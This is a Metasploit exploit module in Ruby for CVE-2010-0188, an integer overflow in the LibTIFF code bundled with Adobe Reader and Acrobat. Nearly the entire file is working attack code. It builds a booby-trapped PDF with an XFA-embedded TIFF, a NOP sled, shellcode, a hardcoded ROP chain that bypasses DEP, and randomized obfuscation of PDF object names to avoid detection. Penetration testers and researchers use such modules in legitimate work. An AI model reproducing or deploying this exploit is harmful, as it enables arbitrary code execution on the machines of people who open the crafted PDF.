##
# $Id: adobe_libtiff.rb 10477 2010-09-25 11:59:02Z mc $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'
require 'zlib'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GoodRanking

	include Msf::Exploit::FILEFORMAT

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Adobe Acrobat Bundled LibTIFF Integer Overflow',
			'Description'    => %q{
				This module exploits an integer overflow vulnerability in Adobe Reader and Adobe Acrobat
				Professional versions 8.0 through 8.2 and 9.0 through 9.3.
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'Microsoft',                         # reported to Adobe
					'villy <villys777 [at] gmail.com>',  # public exploit
					# Metasploit version by:
					'jduck'
				],
			'Version'        => '$Revision: 10477 $',
			'References'     =>
				[
					[ 'CVE', '2010-0188' ],
					[ 'BID', '38195' ],
					[ 'OSVDB', '62526' ],
					[ 'URL', 'http://www.adobe.com/support/security/bulletins/apsb10-07.html' ],
					[ 'URL', 'http://secunia.com/blog/76/' ],
					[ 'URL', 'http://bugix-security.blogspot.com/2010/03/adobe-pdf-libtiff-working-exploitcve.html' ]
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
					'InitialAutoRunScript' => 'migrate -f',
					'DisablePayloadHandler' => 'true',
				},
			'Payload'        =>
				{
					'Space'         => 1024,
					'BadChars'      => "\x00",
					'DisableNops'	 => true
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					# test results (on Windows XP SP3)
					# reader 6.0.1 - untested
					# reader 7.0.5 - untested
					# reader 7.0.8 - untested
					# reader 7.0.9 - untested
					# reader 7.1.0 - untested
					# reader 7.1.1 - untested
					# reader 8.0.0 - untested
					# reader 8.1.1 - untested
					# reader 8.1.2 - untested
					# reader 8.1.3 - untested
					# reader 8.1.4 - untested
					# reader 8.1.5 - untested
					# reader 8.1.6 - untested
					# reader 8.2.0 - untested
					# reader 9.0.0 - untested
					# reader 9.1.0 - untested
					# reader 9.2.0 - untested
					# reader 9.3.0 - works
					[ 'Adobe Reader 9.3.0 on Windows XP SP3 English (w/DEP bypass)',
						{
							# ew, hardcoded offsets - see make_tiff()
						}
					],
				],
			'DisclosureDate' => 'Feb 16 2010',
			'DefaultTarget'  => 0))

		register_options(
			[
				OptString.new('FILENAME', [ true, 'The file name.',  'msf.pdf']),
			], self.class)

	end

	def exploit

		tiff_data = make_tiff(payload.encoded)
		xml_data = make_xml(tiff_data)
		compressed = Zlib::Deflate.deflate(xml_data)

		# Create the pdf
		pdf = make_pdf(compressed)

		print_status("Creating '#{datastore['FILENAME']}' file...")

		file_create(pdf)

	end


	def RandomNonASCIIString(count)
		result = ""
		count.times do
			result << (rand(128) + 128).chr
		end
		result
	end

	def ioDef(id)
		"%d 0 obj\r\n" % id
	end

	def ioRef(id)
		"%d 0 R" % id
	end


	#http://blog.didierstevens.com/2008/04/29/pdf-let-me-count-the-ways/
	def nObfu(str)
		result = ""
		str.scan(/./u) do |c|
			if rand(2) == 0 and c.upcase >= 'A' and c.upcase <= 'Z'
				result << "#%x" % c.unpack("C*")[0]
			else
				result << c
			end
		end
		result
	end


	def ASCIIHexWhitespaceEncode(str)
		result = ""
		whitespace = ""
		str.each_byte do |b|
			result << whitespace << "%02x" % b
			whitespace = " " * (rand(3) + 1)
		end
		result << ">"
	end


	def make_pdf(xml_data)

		xref = []
		eol = "\x0d\x0a"
		endobj = "endobj" << eol

		pdf = "%PDF-1.5" << eol
		pdf << "%" << RandomNonASCIIString(4) << eol

		xref << pdf.length
		pdf << ioDef(1) << nObfu("<</Filter/FlateDecode/Length ") << xml_data.length.to_s << nObfu("/Type /EmbeddedFile>>") << eol
		pdf << "stream" << eol
		pdf << xml_data << eol
		pdf << eol << "endstream" << eol
		pdf << endobj

		xref << pdf.length
		pdf << ioDef(2) << nObfu("<</V () /Kids [") << ioRef(3) << nObfu("] /T (") << "topmostSubform[0]" << nObfu(") >>") << eol << endobj

		xref << pdf.length
		pdf << ioDef(3) << nObfu("<</Parent ") << ioRef(2) << nObfu(" /Kids [") << ioRef(4) << nObfu("] /T (") << "Page1[0]" << nObfu(")>>")
		pdf << eol << endobj

		xref << pdf.length
		pdf << ioDef(4) << nObfu("<</MK <</IF <</A [0.0 1.0]>>/TP 1>>/P ") << ioRef(5)
		pdf << nObfu("/FT /Btn/TU (") << "ImageField1" << nObfu(")/Ff 65536/Parent ") << ioRef(3)
		pdf << nObfu("/F 4/DA (/CourierStd 10 Tf 0 g)/Subtype /Widget/Type /Annot/T (") << "ImageField1[0]" << nObfu(")/Rect [107.385 705.147 188.385 709.087]>>")
		pdf << eol << endobj

		xref << pdf.length
		pdf << ioDef(5) << nObfu("<</Rotate 0 /CropBox [0.0 0.0 612.0 792.0]/MediaBox [0.0 0.0 612.0 792.0]/Resources <</XObject >>/Parent ")
		pdf << ioRef(6) << nObfu("/Type /Page/PieceInfo null>>")
		pdf << eol << endobj

		xref << pdf.length
		pdf << ioDef(6) << nObfu("<</Kids [") << ioRef(5) << nObfu("]/Type /Pages/Count 1>>")
		pdf << eol << endobj

		xref << pdf.length
		pdf << ioDef(7) << ("<</PageMode /UseAttachments/Pages ") << ioRef(6)
		pdf << ("/MarkInfo <</Marked true>>/Lang (en-us)/AcroForm ") << ioRef(8)
		pdf << ("/Type /Catalog>>")
		pdf << eol << endobj

		xref << pdf.length
		pdf << ioDef(8) << nObfu("<</DA (/Helv 0 Tf 0 g )/XFA [(template) ") << ioRef(1) << nObfu("]/Fields [")
		pdf << ioRef(2) << nObfu("]>>")
		pdf << endobj << eol

		xrefPosition = pdf.length
		pdf << "xref" << eol
		pdf << "0 %d" % (xref.length + 1) << eol
		pdf << "0000000000 65535 f" << eol
		xref.each do |index|
			pdf << "%010d 00000 n" % index << eol
		end
		pdf << "trailer" << nObfu("<</Size %d/Root " % (xref.length + 1)) << ioRef(7) << ">>" << eol
		pdf << "startxref" << eol
		pdf << xrefPosition.to_s() << eol
		pdf << "%%EOF"

	end

	def make_tiff(code)
		tiff_offset = 0x2038
		shellcode_offset = 1500

		tiff =  "II*\x00"
		tiff << [tiff_offset].pack('V')
		tiff << make_nops(shellcode_offset)
		tiff << code

		# Padding
		tiff << rand_text_alphanumeric(tiff_offset - 8 - code.length - shellcode_offset)

		tiff << "\x07\x00\x00\x01\x03\x00\x01\x00"
		tiff << "\x00\x00\x30\x20\x00\x00\x01\x01\x03\x00\x01\x00\x00\x00\x01\x00"
		tiff << "\x00\x00\x03\x01\x03\x00\x01\x00\x00\x00\x01\x00\x00\x00\x06\x01"
		tiff << "\x03\x00\x01\x00\x00\x00\x01\x00\x00\x00\x11\x01\x04\x00\x01\x00"
		tiff << "\x00\x00\x08\x00\x00\x00\x17\x01\x04\x00\x01\x00\x00\x00\x30\x20"
		tiff << "\x00\x00\x50\x01\x03\x00\xCC\x00\x00\x00\x92\x20\x00\x00\x00\x00"
		tiff << "\x00\x00\x00\x0C\x0C\x08\x24\x01\x01\x00"

		# The following executes a ret2lib using BIB.dll
		# The effect is to bypass DEP and execute the shellcode in an indirect way
		stack_data = [
			0x70072f7,      # pop eax / ret
			0x10104,
			0x70015bb,      # pop ecx / ret
			0x1000,
			0x700154d,      # mov [eax], ecx / ret
			0x70015bb,      # pop ecx / ret
			0x7ffe0300,     # -- location of KiFastSystemCall
			0x7007fb2,      # mov eax, [ecx] / ret
			0x70015bb,      # pop ecx / ret
			0x10011,
			0x700a8ac,      # mov [ecx], eax / xor eax,eax / ret
			0x70015bb,      # pop ecx / ret
			0x10100,
			0x700a8ac,      # mov [ecx], eax / xor eax,eax / ret
			0x70072f7,      # pop eax / ret
			0x10011,
			0x70052e2,      # call [eax] / ret -- (KiFastSystemCall - VirtualAlloc?)
			0x7005c54,      # pop esi / add esp,0x14 / ret
			0xffffffff,
			0x10100,
			0x0,
			0x10104,
			0x1000,
			0x40,
			# The next bit effectively copies data from the interleaved stack to the memory
			# pointed to by eax
			# The data copied is:
			# \x5a\x52\x6a\x02\x58\xcd\x2e\x3c\xf4\x74\x5a\x05\xb8\x49\x49\x2a
			# \x00\x8b\xfa\xaf\x75\xea\x87\xfe\xeb\x0a\x5f\xb9\xe0\x03\x00\x00
			# \xf3\xa5\xeb\x09\xe8\xf1\xff\xff\xff\x90\x90\x90\xff\xff\xff\x90
			0x700d731,      # mov eax, [ebp-0x24] / ret
			0x70015bb,      # pop ecx / ret
			0x26a525a,
			0x700154d,      # mov [eax], ecx / ret
			0x700a722,      # add eax, 4 / ret
			0x70015bb,      # pop ecx / ret
			0x3c2ecd58,
			0x700154d,      # mov [eax], ecx / ret
			0x700a722,      # add eax, 4 / ret
			0x70015bb,      # pop ecx / ret
			0xf4745a05,
			0x700154d,      # mov [eax], ecx / ret
			0x700a722,      # add eax, 4 / ret
			0x70015bb,      # pop ecx / ret
			0x2a4949b8,
			0x700154d,      # mov [eax], ecx / ret
			0x700a722,      # add eax, 4 / ret
			0x70015bb,      # pop ecx / ret
			0xaffa8b00,
			0x700154d,      # mov [eax], ecx / ret
			0x700a722,      # add eax, 4 / ret
			0x70015bb,      # pop ecx / ret
			0xfe87ea75,
			0x700154d,      # mov [eax], ecx / ret
			0x700a722,      # add eax, 4 / ret
			0x70015bb,      # pop ecx / ret
			0xb95f0aeb,
			0x700154d,      # mov [eax], ecx / ret
			0x700a722,      # add eax, 4 / ret
			0x70015bb,      # pop ecx / ret
			0x3e0,
			0x700154d,      # mov [eax], ecx / ret
			0x700a722,      # add eax, 4 / ret
			0x70015bb,      # pop ecx / ret
			0x9eba5f3,
			0x700154d,      # mov [eax], ecx / ret
			0x700a722,      # add eax, 4 / ret
			0x70015bb,      # pop ecx / ret
			0xfffff1e8,
			0x700154d,      # mov [eax], ecx / ret
			0x700a722,      # add eax, 4 / ret
			0x70015bb,      # pop ecx / ret
			0x909090ff,
			0x700154d,      # mov [eax], ecx / ret
			0x700a722,      # add eax, 4 / ret
			0x70015bb,      # pop ecx / ret
			0x90ffffff,
			0x700154d,      # mov [eax], ecx / ret
			0x700d731,      # mov eax, [ebp-0x24] / ret
			0x700112f       # call eax -- (execute stub to transition to full shellcode)
		].pack('V*')

		tiff << stack_data

		Rex::Text.encode_base64(tiff)
	end

	def make_xml(tiff_data)
		xml_data = %Q|<?xml version="1.0" encoding="UTF-8" ?>
<xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/">
<config xmlns="http://www.xfa.org/schema/xci/1.0/">
<present>
<pdf>
<version>1.65</version>
<interactive>1</interactive>
<linearized>1</linearized>
</pdf>
<xdp>
<packets>*</packets>
</xdp>
<destination>pdf</destination>
</present>
</config>
<template baseProfile="interactiveForms" xmlns="http://www.xfa.org/schema/xfa-template/2.4/">
<subform name="topmostSubform" layout="tb" locale="en_US">
<pageSet>
<pageArea id="PageArea1" name="PageArea1">
<contentArea name="ContentArea1" x="0pt" y="0pt" w="612pt" h="792pt" />
<medium short="612pt" long="792pt" stock="custom" />
</pageArea>
</pageSet>
<subform name="Page1" x="0pt" y="0pt" w="612pt" h="792pt">
<break before="pageArea" beforeTarget="#PageArea1" />
<bind match="none" />
<field name="ImageField1" w="28.575mm" h="1.39mm" x="37.883mm" y="29.25mm">
<ui>
<imageEdit />
</ui>
</field>
<?templateDesigner expand 1?>
</subform>
<?templateDesigner expand 1?>
</subform>
<?templateDesigner FormTargetVersion 24?>
<?templateDesigner Rulers horizontal:1, vertical:1, guidelines:1, crosshairs:0?>
<?templateDesigner Zoom 94?>
</template>
<xfa:datasets xmlns:xfa="http://www.xfa.org/schema/xfa-data/1.0/">
<xfa:data>
<topmostSubform>
<ImageField1 xfa:contentType="image/tif" href="">REPLACE_TIFF</ImageField1>
</topmostSubform>
</xfa:data>
</xfa:datasets>
<PDFSecurity xmlns="http://ns.adobe.com/xtd/" print="1" printHighQuality="1" change="1" modifyAnnots="1" formFieldFilling="1" documentAssembly="1" contentCopy="1" accessibleContent="1" metadata="1" />
<form checksum="a5Mpguasoj4WsTUtgpdudlf4qd4=" xmlns="http://www.xfa.org/schema/xfa-form/2.8/">
<subform name="topmostSubform">
<instanceManager name="_Page1" />
<subform name="Page1">
<field name="ImageField1" />
</subform>
<pageSet>
<pageArea name="PageArea1" />
</pageSet>
</subform>
</form>
</xdp:xdp>
|
		xml_data.gsub!(/REPLACE_TIFF/, tiff_data)

		xml_data
	end

end
